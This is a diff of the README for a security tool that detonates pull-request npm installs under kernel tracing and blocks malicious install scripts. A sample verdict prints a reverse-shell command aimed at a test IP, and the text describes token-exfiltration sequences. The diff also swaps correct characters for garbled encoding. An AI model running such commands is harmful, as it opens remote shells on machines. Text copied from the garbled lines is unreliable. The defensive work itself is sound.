@@ -1,17 +1,17 @@
 # PR Detonator
 
-**Static scanners read code. PR Detonator runs it — under kernel tracing — and holds what it
+**Static scanners read code. PR Detonator runs it â€” under kernel tracing â€” and holds what it
 did against what the pull request claimed.**
 
 > **We pointed it at 100 packages published to npm minutes earlier, knowing nothing about any
 > of them. 73 installed and all 73 came back clean. Of the 27 that did not install, one was
-> blocked anyway — on evidence captured before it timed out.**
+> blocked anyway â€” on evidence captured before it timed out.**
 >
 > That one connected to a hardcoded IP address on a non-standard port during `postinstall`,
 > with no DNS lookup at all. Reading its published source explained why: a fallback path
 > downloads the product binary from that bare IP with **TLS certificate verification
 > disabled**, then extracts it and links it as the executable. Anyone who can intercept that
-> connection — or who later controls that address — gets arbitrary code executed on every
+> connection â€” or who later controls that address â€” gets arbitrary code executed on every
 > machine running `npm install`.
 >
 > It isn't malware. The maintainer owns the package; it's a deliberate fallback with an unsafe
@@ -19,7 +19,7 @@ did against what the pull request claimed.**
 > or fix yet, so the name is left out of this text, though it is recoverable from this
 > repository's earlier history. But nobody told us to look, and no advisory existed: the
 > behavior alone gave it away.
-> ([method](eval/SWEEP.md) · [what `npm audit` says instead](eval/BASELINE.md))
+> ([method](eval/SWEEP.md) Â· [what `npm audit` says instead](eval/BASELINE.md))
 
 We then scaled the same sweep to **500** of the newest packages: 413 of 421 that installed
 cleared, nothing benign was hard-blocked, seven were routed to *needs review*, and the one
@@ -28,15 +28,15 @@ block was a package that downloads and runs binaries during `install`.
 
 ## Why now
 
-Install-time supply-chain attacks are the ones that actually land — event-stream, ua-parser-js,
-the Shai-Hulud worm — because a package's `postinstall` runs on every laptop and CI runner
+Install-time supply-chain attacks are the ones that actually land â€” event-stream, ua-parser-js,
+the Shai-Hulud worm â€” because a package's `postinstall` runs on every laptop and CI runner
 before anyone imports a line of its code. The pull request that lets one in is usually a
 **one-line version bump**, so there is nothing in the diff to review.
 
 And increasingly nobody is reviewing it anyway: **AI coding agents now open the PRs and pick
 the dependencies**, including packages that don't exist, which attackers then register. Review
 has become the bottleneck precisely as the volume of machine-written dependency changes
-exploded. PR Detonator is the layer that checks what the agent just installed — by running it.
+exploded. PR Detonator is the layer that checks what the agent just installed â€” by running it.
 
 A GitHub App: on every pull request it runs the PR's `npm install` in a disposable hardened
 sandbox, traces every process, connection and DNS lookup at the kernel level with eBPF
@@ -52,7 +52,7 @@ install): https://fugeretrevin--pr-detonator-dashboard.us-east.modal.run/
 A PR titled **"Add install-time telemetry opt-out"** adds a script that base64-decodes and
 spawns a reverse shell. PR Detonator's comment:
 
-> ## PR Detonator: 🛑 Blocked
+> ## PR Detonator: ðŸ›‘ Blocked
 > | | |
 > |---|---|
 > | **Stated intent** | Add install-time telemetry opt-out to disable anonymous usage telemetry during CI installs. |
@@ -60,22 +60,22 @@ spawns a reverse shell. PR Detonator's comment:
 >
 > | Severity | Rule | Evidence |
 > |---|---|---|
-> | 🔴 critical | `EXEC_INTERACTIVE_SHELL` | /dev/tcp socket redirect: `/usr/bin/bash -c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"` |
-> | 🟠 high | `NET_RAW_IP` | bash connected to 203.0.113.10:4444 with no DNS lookup |
+> | ðŸ”´ critical | `EXEC_INTERACTIVE_SHELL` | /dev/tcp socket redirect: `/usr/bin/bash -c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"` |
+> | ðŸŸ  high | `NET_RAW_IP` | bash connected to 203.0.113.10:4444 with no DNS lookup |
 >
-> **Process tree:** `npm install → sh -c "node scripts/telemetry-optout.js" → node → bash -c "bash -i >& /dev/tcp/…"`
+> **Process tree:** `npm install â†’ sh -c "node scripts/telemetry-optout.js" â†’ node â†’ bash -c "bash -i >& /dev/tcp/â€¦"`
 >
 > ### What happened, in order
-> - `+0.00s` ▶ **npm** install started
-> - `+0.44s` 📜 **npm** ran the install script `node scripts/telemetry-optout.js`
-> - `+0.48s` ⚙ **bash** ran `-c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"`
-> - `+0.48s` 🌐 **bash** connected to `203.0.113.10:4444`
+> - `+0.00s` â–¶ **npm** install started
+> - `+0.44s` ðŸ“œ **npm** ran the install script `node scripts/telemetry-optout.js`
+> - `+0.48s` âš™ **bash** ran `-c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"`
+> - `+0.48s` ðŸŒ **bash** connected to `203.0.113.10:4444`
 
 That last section is the one a reviewer reads first. Four findings are a list; the same four
 facts in the kernel's own recorded order are an attack. For the Shai-Hulud reconstruction it
-reads: ran the install script → opened `~/.npmrc` → fetched a GitHub release → unpacked it →
-ran **trufflehog** over the workspace → `POST`ed to `webhook.site`, 3.9 s in. The ordering is
-the kernel's nanosecond timestamps, not a reconstruction, and the section is **report-only** —
+reads: ran the install script â†’ opened `~/.npmrc` â†’ fetched a GitHub release â†’ unpacked it â†’
+ran **trufflehog** over the workspace â†’ `POST`ed to `webhook.site`, 3.9 s in. The ordering is
+the kernel's nanosecond timestamps, not a reconstruction, and the section is **report-only** â€”
 built after the verdict, so it can never change one.
 
 ## Architecture
@@ -84,7 +84,7 @@ built after the verdict, so it can never change one.
 flowchart LR
     GH[GitHub] -- "pull_request webhook" --> WH
     subgraph Brain["Brain (Modal, serverless, no untrusted code)"]
-        WH["webhook<br/>verify signature · allowlist · dedupe<br/>check run: in_progress"] -- spawn --> JOB["detonate_job"]
+        WH["webhook<br/>verify signature Â· allowlist Â· dedupe<br/>check run: in_progress"] -- spawn --> JOB["detonate_job"]
         JOB --> RULES["deterministic rules<br/>(verdict floor)"]
         RULES --> LLM["Meta model<br/>intent vs behavior"]
         LLM --> V["verdict = max(rules, llm)"]
@@ -112,7 +112,7 @@ flowchart LR
    `EXEC_INTERACTIVE_SHELL`, `EXEC_DECODE_PIPE`, ...).
 4. **The model** (Meta `muse-spark-1.3`, structured JSON output) compares stated intent with
    observed behavior and writes the explanation.
-5. **Verdict** = `max(rule severity, model severity)` → check conclusion + PR comment. Branch
+5. **Verdict** = `max(rule severity, model severity)` â†’ check conclusion + PR comment. Branch
    protection turns a failing check into a blocked merge.
 6. **The dependency did it**: the kernel records the directory npm runs each install script
    in (`node_modules/<pkg>`, set before any package code runs), so a Dependabot-style bump
@@ -130,9 +130,9 @@ flowchart LR
    203.0.113.10:4444"). Low findings the old version already produced are suppressed, so
    routine bumps stay quiet; high/critical are never suppressed.
 
-10. **Investigator agent** (⚠️ only): when the verdict is "needs review", Muse gets three
+10. **Investigator agent** (âš ï¸ only): when the verdict is "needs review", Muse gets three
     read-only tools (npm registry facts, our host classification, the captured install
-    script) and writes the reviewer a triage note — "puppeteer, published 2013, maintainers
+    script) and writes the reviewer a triage note â€” "puppeteer, published 2013, maintainers
     unchanged, install.mjs only downloads a browser from a known CDN". It can escalate to
     blocked but never clear a finding.
 11. **Per-repo policy**: `.github/detonator.yml`, read from the **base** branch only (never
@@ -141,7 +141,7 @@ flowchart LR
     (`model_requirement: required`). It can only tighten review, never silence a kernel
     finding.
 12. **New-package signal**: a deterministic npm-registry lookup flags an added dependency
-    that doesn't exist (a name an attacker could register — "slopsquatting") or was first
+    that doesn't exist (a name an attacker could register â€” "slopsquatting") or was first
     published in the last week. Low severity, so a human reviews before it installs.
 
 ## Why it's hard to fool
@@ -150,7 +150,7 @@ flowchart LR
   diff are attacker-controlled, so the post-run analysis only *escalates*: a HIGH or CRITICAL
   rule hit cannot be cleared by any model output. The one exception is deliberately narrow and
   pre-committed: the Intent Contract's prediction, made before the install runs, can clear a
-  single LOW `NET_UNLISTED_DOMAIN` hit for a host it named in advance — never a raw IP, never a
+  single LOW `NET_UNLISTED_DOMAIN` hit for a host it named in advance â€” never a raw IP, never a
   shared-hosting domain anyone can publish under, and never when the PR itself added install
   scripts. Clearing needs **two independent keys**: the prediction must name the host *and* the
   host must be on an allowlist shipped in this repo or in the repo's base-branch policy. Author
@@ -186,17 +186,17 @@ flowchart LR
 
 ## Results
 
-**Registry sweep — real packages nobody curated** ([details](eval/SWEEP.md)): we took the 100
+**Registry sweep â€” real packages nobody curated** ([details](eval/SWEEP.md)): we took the 100
 most recent publishes straight off npm's change feed and detonated them. Of the 73 that
-install on linux-x64: **0 blocked, 0 needs-review** — the false-positive number comes from
+install on linux-x64: **0 blocked, 0 needs-review** â€” the false-positive number comes from
 real registry traffic, not a list we chose. 7 ran install scripts. One package (which hung
 past our timeout) connected to a hardcoded IP on port 4443 with no DNS lookup at all; that is
 reported as an observation for review, not an accusation.
 
 **What the tool everyone already runs says about the same PRs** ([details](eval/BASELINE.md)):
 `npm audit` reports **"found 0 vulnerabilities"** on the Shai-Hulud reconstruction, on an
-`$(env)`-exfiltrating postinstall, on a base64→`sh` payload, and on a stolen-token request.
-It *does* catch our ua-parser-js reconstruction — because that attack has had an advisory
+`$(env)`-exfiltrating postinstall, on a base64â†’`sh` payload, and on a stolen-token request.
+It *does* catch our ua-parser-js reconstruction â€” because that attack has had an advisory
 since 2021. Advisory databases are retrospective; PR Detonator blocked all five from behavior
 alone, which is what you need the first time an attack runs.
 
@@ -216,7 +216,7 @@ Every one of those 142 runs carries a **per-job sensor witness**: the sandbox ex
 nonce-marked marker before and after the install, and a missing marker fails the check closed
 rather than passing as quiet. 139 recorded both markers; the 3 that recorded only the first are
 exactly the 3 that hit the timeout and were killed. And **452 of 452** of Muse's *cited* claims
-point at a real kernel event of the right type, with none rejected and no invented hosts —
+point at a real kernel event of the right type, with none rejected and no invented hosts â€”
 checked by code, not taken on trust. That figure covers cited evidence plus any host or IP in
 the prose, so it measures citation discipline rather than total factual accuracy
 ([how, and what it misses](eval/README.md)).
@@ -229,7 +229,7 @@ LOW, so its verdict depends on whether Muse returns `malicious` or `suspicious`.
 is not determinism, and a single run would have let us publish the luckier number.
 
 Of those 104 benign packages, **95 are verified clean, 3 need review and 6 are "could not
-verify"** — four (`better-sqlite3`, `argon2`, `cpu-features`, `node-pty`) fail to compile
+verify"** â€” four (`better-sqlite3`, `argon2`, `cpu-features`, `node-pty`) fail to compile
 without a C toolchain in the image and two (`biome`, `cypress`) hit the install timeout. We
 refuse to call an install clean that we never watched finish. That is a limit of our sandbox,
 not a mark against those packages, and none of them was blocked.
@@ -238,23 +238,23 @@ End-to-end on real GitHub, real Chamber, real model ([demo repo](https://github.
 
 | Scenario | Result |
 |---|---|
-| README change | ✅ Clean |
-| Add `lodash` | ✅ Clean (registry traffic only) |
-| Add `esbuild` (postinstall binary check) | ✅ Clean, no false positive |
-| Add `puppeteer` (downloads Chrome from `storage.googleapis.com`) | ⚠️ Needs review (mergeable): shared hosting is never auto-cleared; the investigator writes a triage note |
-| "Typo fix" that exfiltrates `env` to a raw IP | 🛑 Blocked: `EXEC_NET_TOOL`, `NET_RAW_IP` |
-| Base64-obfuscated reverse shell | 🛑 Blocked (critical): `EXEC_INTERACTIVE_SHELL` |
-| Exfil + prompt injection in PR body and `package.json` | 🛑 Blocked, injection flagged |
-| Install that hangs forever | 🛑 Could not verify (timeout fails closed) |
-| "Bump color-helper 1.0.0 → 1.0.1" whose new version's postinstall opens a raw socket | 🛑 Blocked: inline comment on the bumped line naming `color-helper` |
+| README change | âœ… Clean |
+| Add `lodash` | âœ… Clean (registry traffic only) |
+| Add `esbuild` (postinstall binary check) | âœ… Clean, no false positive |
+| Add `puppeteer` (downloads Chrome from `storage.googleapis.com`) | âš ï¸ Needs review (mergeable): shared hosting is never auto-cleared; the investigator writes a triage note |
+| "Typo fix" that exfiltrates `env` to a raw IP | ðŸ›‘ Blocked: `EXEC_NET_TOOL`, `NET_RAW_IP` |
+| Base64-obfuscated reverse shell | ðŸ›‘ Blocked (critical): `EXEC_INTERACTIVE_SHELL` |
+| Exfil + prompt injection in PR body and `package.json` | ðŸ›‘ Blocked, injection flagged |
+| Install that hangs forever | ðŸ›‘ Could not verify (timeout fails closed) |
+| "Bump color-helper 1.0.0 â†’ 1.0.1" whose new version's postinstall opens a raw socket | ðŸ›‘ Blocked: inline comment on the bumped line naming `color-helper` |
 
-Detonations take 3–20 s; a full check completes in well under a minute. Demo payloads target
+Detonations take 3â€“20 s; a full check completes in well under a minute. Demo payloads target
 only TEST-NET-3 (`203.0.113.10`), so connect attempts are traced and go nowhere.
 
 ## Layout
 
 ```
-shared/    Brain↔Chamber contract (Pydantic) and HMAC signing
+shared/    Brainâ†”Chamber contract (Pydantic) and HMAC signing
 brain/     Modal app: webhook, GitHub client, rules, enrichment, LLM, verdict, report
 chamber/   VM service: server, detonation, Tetragon telemetry, policies, sandbox, provisioning
 tests/     unit + integration tests against recorded real fixtures (Tetragon, model)
@@ -263,13 +263,7 @@ demo/      scenario payloads for the demo repo
 
 ## Running it
 
-- **Try it without credentials:** `python -m brain.replay dep` replays a real recorded
-  detonation through the real rules: the install's timeline, each finding under the event that
-  caused it, and the rules-only verdict. No VM, no GitHub, no API key, no network.
-  `python -m brain.replay` lists the six recordings; `--all` checks that each still reproduces
-  its verdict; `--live` plays one back at its recorded pace. Muse is the part it can't show,
-  since that needs a Meta API key.
-- **Tests:** `python -m pytest` (771 tests; fixtures recorded from real Tetragon, dnsmasq, firewall-log and model output)
+- **Tests:** `python -m pytest` (1037 tests; fixtures recorded from real Tetragon, dnsmasq, firewall-log and model output)
 - **Chamber:** on Ubuntu 22.04+ with BTF: `sudo bash chamber/provision/setup.sh`
   (installs Tetragon, egress rules, sandbox image, and the systemd service; generates the HMAC secret)
 - **Brain:** create Modal secrets `github-app`, `llama`, `chamber`, `detonator-config`
